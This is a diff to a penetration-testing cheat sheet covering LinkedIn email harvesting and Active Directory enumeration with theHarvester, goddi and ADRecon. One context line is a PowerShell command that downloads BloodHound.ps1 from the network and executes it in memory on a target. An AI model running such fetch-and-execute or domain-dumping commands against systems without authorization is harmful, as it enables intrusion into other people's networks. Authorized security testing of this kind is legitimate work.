@@ -6,6 +6,12 @@
 
 `theharvester -d blah.com -l 1000 -b linkedin`
 
+### Extract Linkedin details from snov.io
+
+Regext to extract emails
+
+`grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`
+
 ### Change format to b.lah
 
 `awk '=FS tolower(substr(,1,1)$NF)' linkedin-user-list.txt | awk '{ print   }'`
@@ -137,6 +143,14 @@ Useful when you have a remote shell.
 Use this when you cannot copy BloodHound.ps1 over to target.
 
 `powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'); Invoke-BloodHound"`
+
+### Goddi (fast dump all domain info)
+
+`.\godditest-windows-amd64.exe -username=testuser -password="testpass!" -domain="test.local" -dc="dc.test.local" -unsafe`
+
+### ADRecon (More detailed - Good for AD Auditing)
+
+https://github.com/sense-of-security/ADRecon
 
 ## Compromise and Lateral Movement
 
